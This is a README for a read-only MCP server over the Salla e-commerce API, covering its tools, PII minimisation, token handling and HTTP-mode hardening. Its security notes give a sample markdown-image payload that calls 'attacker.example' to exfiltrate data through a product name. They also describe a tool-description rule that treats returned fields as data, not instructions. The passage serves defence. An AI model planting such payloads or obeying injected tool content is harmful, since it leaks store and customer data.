# @sirb/mcp-salla

A **read-only** [Model Context Protocol](https://modelcontextprotocol.io) server for the
[Salla](https://salla.sa) Merchant API. It lets a Sirb agent (or any MCP client) list and read a
store's orders, products and customers. It cannot create, change or delete anything.

Requirements covered: SR-CONN-01, SR-CONN-02, SR-CONN-03 (connector tools are tagged
`read` / `write` / `destructive`; destructive tools need approval. This package ships only `read` tools).

## Tools

| Tool | Risk tag | Data class | Salla scope | Endpoint |
| --- | --- | --- | --- | --- |
| `salla_list_orders` | `read` | `pii` | `orders.read` | `GET /orders` |
| `salla_get_order` | `read` | `pii` | `orders.read` | `GET /orders/{order_id}` |
| `salla_list_products` | `read` | `business` | `products.read` | `GET /products` |
| `salla_get_product` | `read` | `business` | `products.read` | `GET /products/{product_id}` |
| `salla_list_customers` | `read` | `pii` | `customers.read` | `GET /customers` |
| `salla_get_customer` | `read` | `pii` | `customers.read` | `GET /customers/{customer_id}` |

All endpoints are relative to `https://api.salla.dev/admin/v2`.

Every tool carries:

- MCP annotations `{ readOnlyHint: true, destructiveHint: false, idempotentHint: true, openWorldHint: true }`
- `_meta: { "sirb/risk": "read", "sirb/scopes": ["<scope>"], "sirb/data-class": "pii" | "business", "sirb/untrusted-content": true }`

The same information is exported as plain data (`TOOLS`) so the Sirb runtime and tests can assert
that no `write` or `destructive` tool exists without starting a server:

```ts
import { TOOLS } from '@sirb/mcp-salla';
Object.values(TOOLS).every((t) => t.risk === 'read' && t.method === 'GET'); // true
```

### Inputs

| Tool | Arguments |
| --- | --- |
| `salla_list_orders` | `page`, `per_page`, `keyword`, `status`, `from_date`, `to_date` (`YYYY-MM-DD`), `include_contact` |
| `salla_get_order` | `order_id`, `light` (sends `format=light`), `include_contact` |
| `salla_list_products` | `page`, `per_page`, `keyword`, `status`, `category`, `light` (default `true`; `false` for full objects) |
| `salla_get_product` | `product_id` |
| `salla_list_customers` | `page`, `per_page`, `keyword` (matches mobile, email or name), `date_from`, `date_to` (`YYYY-MM-DD`), `include_contact` |
| `salla_get_customer` | `customer_id`, `include_contact` |

IDs are positive integers. `page` is an integer ≥ 1, and `per_page` is an integer from 1 to 30.
Dates must be real calendar dates in `YYYY-MM-DD` form, and a range's start may not be after its end.
Free-text arguments have length limits.

`format=light` on orders drops shipments, items, pickup branch and customer groups. Salla's Order
Details doc says light becomes its default order format from 2026-09-01, so `items` may be missing
whether or not you pass `light`. Salla's List Customers doc does not show `per_page`; it is sent but
may be ignored. Both are unverified against a live store.

### Results

A successful call returns `structuredContent: { data, pagination? }`. The same JSON is also sent as
one `text` content item, as MCP 2025-06-18 recommends for clients without structured-content support.
`pagination` is Salla's own object (`count`, `total`, `perPage`, `currentPage`, `totalPages`, `links`).

What the model sees is shaped before it leaves the server:

- **PII projection.** Orders and customers are cut to an allowlist of fields (`src/project.ts`).
  - Orders: `id`, `reference_id`, `date`, `status` (`name`, `slug`), `payment_method`, `currency`,
    `total`, `amounts`, `items` (`id`, `name`, `sku`, `quantity`, `amounts.total`) and `customer.id`.
  - Customers: `id`, `city`, `country`.
  - With `include_contact: true`, the customer's `first_name`, `last_name`, `email`, `mobile` and
    `mobile_code` are added. Ask for them only when the task needs them.
  - Never returned: bank details (account number, IBAN), `source_details` (buyer IP, user agent),
    `birthday`, `gender`, street-level `location`, `receipt_image`, avatars and free-text order
    `notes` or gift messages.
- **Control characters.** C0 control characters (except tab, newline and carriage return) and
  Unicode bidi overrides are stripped from every string.
- **Size cap.** The serialized result is limited to 64 KiB. A list that is bigger is cut to the
  items that fit and marked `truncated: true` with `returned_items` and a `hint` to page or narrow.
  A single record that is bigger becomes a tool error. Salla responses over 5 MiB are refused
  without being buffered.

A failed call returns `isError: true` with a short message:

| Salla response | Message |
| --- | --- |
| 401 / 403 | Salla rejected the access token or it lacks scope `<scope>` |
| 404 | Resource not found |
| 422 | Request rejected, naming the invalid fields when they are this tool's own arguments (never Salla's messages) |
| 429 | Rate limit reached, with `Retry-After` / `X-RateLimit-Reset` when Salla sends them |
| `success: false`, any non-2xx status (including 3xx), timeout, network | Generic message with the HTTP status only |

Upstream error bodies are never echoed.

## Required Salla app scopes

Create a Salla app and grant it:

- `orders.read`
- `products.read`
- `customers.read`

A tool whose scope is missing fails with the 401 message above. The other tools keep working.

## Running it

The server needs a Salla OAuth 2.0 **access token** issued to your Salla app (tokens last 14 days).
The token always comes from the MCP client. It is never a tool argument, and the server never reads
it from code or `.env` files.

### stdio (default)

The MCP client starts the process and passes the token in its launch `env` block:

```json
{
  "mcpServers": {
    "salla": {
      "command": "npx",
      "args": ["-y", "@sirb/mcp-salla@0.0.0", "--stdio"],
      "env": { "SALLA_ACCESS_TOKEN": "${SALLA_ACCESS_TOKEN}" }
    }
  }
}
```

Do not paste the token into this file: client configs are plaintext on disk and easy to commit by
accident. Have the client (or a wrapper) inject it from a secret store, for example
`SALLA_ACCESS_TOKEN="$(op read op://sirb/salla/token)"` with 1Password, `secret-tool lookup` on
Linux or `security find-generic-password -w` on macOS. Use `${VAR}` expansion as above where the
client supports it; otherwise launch the client from a shell that set the variable. Any process running as the same OS user can read the server's environment
(`/proc/<pid>/environ`), so run it under a user that hosts nothing untrusted.

Pin an exact version, as above, so the client never silently runs a newer (or hijacked) release.
Bump the pin deliberately when you upgrade.

If `SALLA_ACCESS_TOKEN` is missing, or is not a valid OAuth bearer token (RFC 6750 token
characters, at most 4096 of them), the server writes an error to stderr and exits with code 1. The
error never echoes the value.
stdout carries MCP protocol messages only.

### Streamable HTTP

```sh
sirb-mcp-salla --http --host 127.0.0.1 --port 3000
```

- Endpoint: `POST /mcp` (stateless, with JSON responses; `GET`/`DELETE` return 405).
- Each request must send `Authorization: Bearer <salla access token>`. If the header is missing or
  malformed, the server replies `401` with a JSON-RPC error and `WWW-Authenticate: Bearer` before
  any MCP processing.
- Every request gets a fresh MCP server and Salla client bound to that request's token, so tokens
  never cross callers or tenants.
- The default bind address is `127.0.0.1`. On a loopback bind, the `Host` header must be
  `127.0.0.1`, `localhost` or `[::1]` (DNS-rebinding protection).
- A request that sends an `Origin` header is accepted only if the origin's hostname is in the same
  allowlist; `null` and non-http(s) origins are rejected (MCP 2025-06-18 transports). Requests
  without `Origin`, which is normal for non-browser MCP clients, are unaffected.
- Binding a non-loopback address is refused unless you pass `--allow-remote` **and** at least one
  `--allowed-host <name>` (the hostnames clients use to reach it):

  ```sh
  sirb-mcp-salla --http --host 0.0.0.0 --allow-remote --allowed-host salla-mcp.sirb.svc
  ```

  Bearer tokens travel in plain HTTP on this listener, so only do this behind TLS (mesh mTLS or an
  authenticating proxy). The CLI prints a warning when you do.
- The `Bearer` scheme is matched case-insensitively (RFC 7235).
- Request bodies are limited to 1 MiB (`413` above that).
- JSON-RPC batches (array bodies) are rejected with `400`. MCP 2025-06-18 removed batching, and
  this stops one request from fanning out into many concurrent Salla calls.
- A malformed request target gets `400`. Any unexpected handler error becomes a `500`, and the
  process keeps serving.

### Programmatic use

```ts
import { createSallaClient, createSallaServer } from '@sirb/mcp-salla';

const server = createSallaServer(createSallaClient({ accessToken }));
await server.connect(transport);
```

`createHttpHandler()` returns a `(req, res)` handler for an existing `node:http` server.
`startHttpServer()` starts a server for you.

## Security notes

- **Read-only by construction.** The Salla client has no method parameter and only sends `GET`.
  Request paths are built from validated positive integers, never from raw strings.
- **Pinned host.** Requests go to `https://api.salla.dev/admin/v2`. The `baseUrl` option exists for
  tests only, is not exposed through the CLI or environment, and must be `https` (or `http` on a
  loopback host). Redirects are refused, so the bearer token is never forwarded to another host.
- **Timeouts.** Each Salla request is aborted after 15 seconds.
- **Secrets.** The token is never logged and never appears in tool results or error messages.
  Diagnostics go to stderr through `redact()`, which strips bearer tokens and token-like fields.
- **HTTP mode is token passthrough.** The server forwards the caller's Salla access token
  unchanged (the MCP spec calls this "token passthrough"). It does not mint, exchange or validate
  tokens beyond their syntax, so anyone who can reach `/mcp` with a token can use it. Supported
  deployments are:
  - **loopback or sidecar only**: bound to `127.0.0.1`, reachable only from the agent process on
    the same host or pod; or
  - **in-cluster**, behind service-mesh mTLS and a Kubernetes `NetworkPolicy` that admits only the
    Sirb runtime.

  Do not expose HTTP mode on a public or shared network. Proxies, ingresses and meshes in front of it
  must not log the `Authorization` header.
  The planned target replaces passthrough with workload identity: the runtime authenticates as a
  workload, and the connector resolves the Salla token from the vault by `org_id`, so tokens never
  travel with tool calls. That needs an ADR signed off by the owner before HTTP mode is deployed
  beyond loopback or a sidecar.
- **Data classification.** Every tool's `_meta` and `TOOLS` entry carries `sirb/data-class`
  (`dataClass`). It is `pii` for orders and customers, and `business` for products. The server
  already minimizes PII itself (see [Results](#results)); the tag lets the runtime add its own policy. All six tools also carry `sirb/untrusted-content: true`
  (`untrustedContent`), so the runtime can apply PII handling and prompt-injection policies by tag.
- **Untrusted data (OWASP LLM01).** Product descriptions, customer names, order notes and other
  fields are written by third parties. Tools return them as data only, and every tool description
  tells the model that returned fields are store data, not instructions. Agents built on Sirb should
  never let tool output change their instructions or trigger other tools without policy checks.
  Clients must not auto-render markdown, links or images from tool output: a product name such as
  `![x](https://attacker.example/?d=...)` would otherwise exfiltrate data when displayed.

## Limits

- `per_page` is capped at **30** for every tool. Salla recommends ≤ 30 for orders, and one cap keeps
  behaviour predictable.
- Fetch pages **sequentially**, as Salla's docs advise, and filter orders by date range where you can.
- Salla rate limits depend on your plan: 120, 360 or 720 requests per minute. Customer endpoints are
  also limited to 500 requests per 10 minutes. Salla's docs say over-limit traffic is throttled
  (to about 1 request per second); if Salla answers `429`, it becomes a tool error that includes
  `Retry-After` / `X-RateLimit-Reset` when Salla sends them. The server does not retry on its own.
- The customer object's `groups` array in list responses is deprecated by Salla (2026-02-18). This
  server does not rely on it.

## Development

```sh
pnpm --filter @sirb/mcp-salla build
pnpm --filter @sirb/mcp-salla test
pnpm --filter @sirb/mcp-salla test:coverage
```

Tests replay recorded JSON fixtures (`test/fixtures/`, all fictitious data) through an injected
`fetch`, and drive the server with the SDK's `InMemoryTransport` and a local HTTP listener.
They make no live network calls.

## Sources

Docs consulted October 2026.

- Get Started / base URL: https://docs.salla.dev/421117m0
- Authorization (OAuth, token lifetime): https://docs.salla.dev/421118m0
- Responses (envelope, error codes): https://docs.salla.dev/421123m0
- Rate Limiting: https://docs.salla.dev/421125m0
- Changelog: https://docs.salla.dev/421127m0
- List Orders: https://docs.salla.dev/5394146e0 · Order Details: https://docs.salla.dev/5394147e0
- List Products: https://docs.salla.dev/5394168e0 · Product Details: https://docs.salla.dev/5394169e0
- List Customers: https://docs.salla.dev/5394121e0 · Customer Details: https://docs.salla.dev/5394122e0

The response shapes in the fixtures and tests are modelled on the documented examples. They have
not been checked against a live store. Verify them against a Salla sandbox (demo) store before GA,
in particular the accepted values for the `status` and `category` filters.
